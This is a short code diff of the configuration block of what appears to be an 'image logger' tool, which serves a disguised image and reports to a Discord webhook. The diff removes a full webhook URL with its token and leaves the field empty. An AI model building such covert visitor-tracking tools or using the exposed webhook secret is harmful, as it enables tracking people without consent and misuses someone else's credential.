@@ -10,7 +10,7 @@ __author__ = "sof"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335749202793201725/xFUDkbE9L41qdmAOcJxiTcwo3mT2dIWKcK5r39qo8jvI3SFCwaqVlYgygcHyXLmW7jxg",
+    "webhook": "",
     "image": "https://www.newegg.com/insider/wp-content/uploads/2014/04/windows_xp_bliss-wide.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
